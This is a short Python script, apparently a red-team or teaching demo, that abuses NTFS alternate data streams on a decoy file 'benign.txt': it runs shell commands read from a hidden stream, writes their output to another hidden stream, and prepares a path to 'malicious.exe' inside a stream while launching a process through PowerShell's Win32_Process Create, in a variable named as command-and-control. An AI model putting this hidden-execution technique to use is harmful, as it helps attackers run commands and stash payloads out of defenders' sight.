import os
from pathlib import Path
import subprocess

def buildADSFilename(filename, streamname):
    return filename+":"+streamname

decoy = "benign.txt"
resultfile = buildADSFilename(decoy, "results.txt")
commandfile = buildADSFilename(decoy, "commands.txt")

with open(commandfile, "r", encoding="utf-8") as c:
    try:
        for line in c:
            subprocess.run(f'{line.strip()} >> "{resultfile}"', shell=True)
    except Exception as e:
        print(f"Cannot start process: {e}")

exefile = "malicious.exe"
exepath = Path.cwd() / buildADSFilename(decoy, exefile)

try:
    ps_c2 = f'Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{{CommandLine="notepad.exe"}}'
    subprocess.run(['powershell', '-NoProfile', '-Command', ps_c2], shell = False)
except Exception as e:
    print("Cannont create process:" + e)